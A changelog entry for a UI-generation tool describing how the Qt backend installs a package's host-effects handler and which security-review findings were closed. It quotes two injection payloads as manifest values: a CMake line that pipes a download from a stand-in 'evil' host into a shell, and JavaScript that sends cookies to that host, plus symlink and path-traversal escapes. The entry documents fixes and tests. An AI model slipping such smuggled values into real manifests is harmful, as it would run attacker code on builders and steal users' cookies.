### Added — Qt wires a package's `[host_effects]` handler

The emitter half of UI47 §5.5, for the first backend. `[host_effects]` parsed
(mosaic-package-manifest) but nothing read it; now Qt does.

Three things happen for a package that declares a Qt handler:

- **`files` are copied** into the backend output directory by
  `install_host_effects`.
- **They are added to the Qt target.** Qt names its sources explicitly —
  `qt_add_executable(… main.cpp)` plus `target_sources(… MosaicHost.cpp
  MosaicHost.h)` — so a file merely copied in is never compiled. That is
  precisely why the section carries a build-source obligation and not only a
  copy: on React and HTML, `[host_assets]` already wires new files in through
  `activate_react_host_asset` and its sibling, but on Qt and XAML nothing does.
- **The generated `main.cpp` installs the handler**, immediately after the host
  is constructed.

Two details that are decisions rather than accidents:

**The install call is anchored on the declaration, not a line number.** The
generated entry point has two shapes — the native-complete one indents four
spaces, the other indents two and wraps the host in `#if MOSAIC_HAS_HOST`.
Inserting after the declaration inherits whichever guard context it is already
in, so the call cannot land outside the `#if` that defines the host, and the
indentation is taken from the declaration rather than assumed.

**The `#include` is guarded exactly when the host is.** Includes are file-scope
only, so it cannot sit beside the call; an unguarded one would compile a header
declaring a function that takes a `MosaicHost` in a build that has none.

Effects raised by the *startup* update are still fail-swept — the host creates
the application in its constructor and settles that update there, before any
handler can exist. UI47 §5.5.4 records that limit and why two-phase construction
across five templates is not worth paying for speculatively.

#### Closed here: the symlink escape this section would have inherited

`install_host_assets` resolves a package-relative source through
`safe_manifest_relative_path`, which is **lexical** — it refuses `..` and
absolute paths, and a symlink at an innocent-looking relative path passes it.
The bytes are then read and copied into the generated project.

`install_host_effects` canonicalises the source and requires it to be inside the
package, the way `load_package_tokens` already does for the style palette. These
files are *compiled and shipped* rather than merely copied, which is what made it
worth closing before the section had a consumer rather than after.

The same gap remains in `install_host_assets`, which is worth closing separately
rather than copying.

Mutation-tested: inserting the install call before the declaration fails the
ordering test, and disabling the containment check fails the symlink test.

#### From the security review of this change

**CMake injection through `[host_effects].files[].target` (critical).** Unlike
`install` and `include`, `target` had no parse-time validation at all — and it
is interpolated into a generated build command, not merely used as a
destination. The emitter's own path check is *lexical*: it refuses `..` and
absolute paths, and newlines and parens are legal in a Unix filename, so

```toml
target = "e.cpp)\nexecute_process(COMMAND sh -c \"curl -s http://evil/x | sh\")\n#"
```

splits into ordinary `Normal` components, passes, and produces syntactically
valid CMake that runs at **configure** time on whoever builds the emitted
project. Lesser variants need no newline at all: `${CMAKE_SOURCE_DIR}`,
`$ENV{…}` and `;` list-splitting all expand from the same slot.

`target` is now shape-checked in `validate_host_effects`, which is the layer
that fixes every backend emitter at once rather than five that each have to
remember. A test asserts the payload is refused, and a second asserts that the
lexical path check *would* have accepted it — so if that check ever grows teeth,
the reason this lives at parse gets re-read rather than deleted.

As a second layer, Qt now emits each target as its own quoted argument rather
than space-joining them. Nothing should reach there needing the quotes; they are
what stops a future loosening of the regex from becoming injection quietly.

**A host-effects file could silently replace a generated one (high).**
`[host_assets]` may replace a generated file and *reports* it through
`DegradationReport::replaced_generated_files` — the signal a reviewer reads to
see that a package took over the application boundary, and what UI47 §5.5.5
pins its acceptance assertion to. `install_host_effects` runs after that pass
and returns only the paths it wrote, so a `target` of `main.cpp` or
`MosaicHost.cpp` would take the boundary over with that field coming back
**empty**.

Refused outright rather than recorded: a `[host_effects]` file is a new build
source by definition, never a replacement. A package that means to replace a
generated file says so in `[host_assets]`, where it is disclosed.

**An `include` could name a header outside the package.** `:` is in the charset
for Dart's `package:` scheme, which also admitted `C:/Users/Public/backdoor.h` —
an absolute path every MSVC-family compiler resolves. Only the one scheme that
needs a colon may carry one now.

Two smaller ones: the `#include` is inserted at the start of its line rather than
at a raw byte offset, matching the care the install call already took; and a
source that resolves inside the package but is not a regular file is refused,
because `fs::read` on a FIFO blocks the build forever rather than failing it.

Mutation-tested: removing the `target` check fails the injection test, and
disabling the containment check fails the symlink test.

#### Round 2, and the twin hole it found

Round 1's six findings are closed. Round 2 confirmed that and answered the scope
question I had asked it: fixing only `[host_effects]` was **defensible but
incomplete**.

`[host_assets]`'s `target` has the same shape hole and reaches two more sinks —
`activate_react_host_asset` prepends `import "./{target}";` to the generated
`main.tsx`, and the HTML one emits `<script src="./{target}">`. A `"` and a `;`
are legal in a Unix filename, so

```toml
target = 'src/x";fetch("http://evil/"+document.cookie);//.ts'
```

becomes executable JavaScript on line 1 of the emitted app — and under Electron,
in a renderer. Capped below the CMake case because a package shipping a `.ts`
host asset can already run JS by putting it *in the file*, but that is precisely
the argument this section already makes for itself: a manifest string defeats any
review that reads files.

The regex is now shared and applied to `[host_assets]`'s `source` and `target`
too. Every one of the 32 host-asset paths this repo actually ships still parses,
and a test pins that list so a future tightening cannot quietly break the corpus.

Also from round 2: the `package:` exemption let a `..` fuse to the scheme, so
`package:../x` satisfied a `split('/')` check that never had a `..` *segment* to
find. The scheme is now stripped before the remainder is validated, which makes
the stated invariant actually hold, and the negative cases have tests —
previously only the positive Dart form did.

Three existing tests moved rather than broke. `MosaicHost.cpp/`,
`MosaicHost.cpp/.` and `./MosaicHost.cpp` used to be driven through a full build
to assert they were *reported* as replacements; they no longer parse, so
allowed-and-disclosed became refused-outright. A companion test pins the new
refusal, and the case-insensitive collision — `mosaichost.cpp`, the one spelling
that still needs the canonical comparison and that a string compare would miss —
stays exactly where it was.

One thing deliberately left: `install_host_assets` still reads its source without
the canonicalise-and-contain check `install_host_effects` now uses, so a symlink
there escapes the package. Closing it means lifting those lines into a shared
helper, which changes behaviour for an existing, shipping section — its own
change, with its own blast radius, rather than a rider on this one.



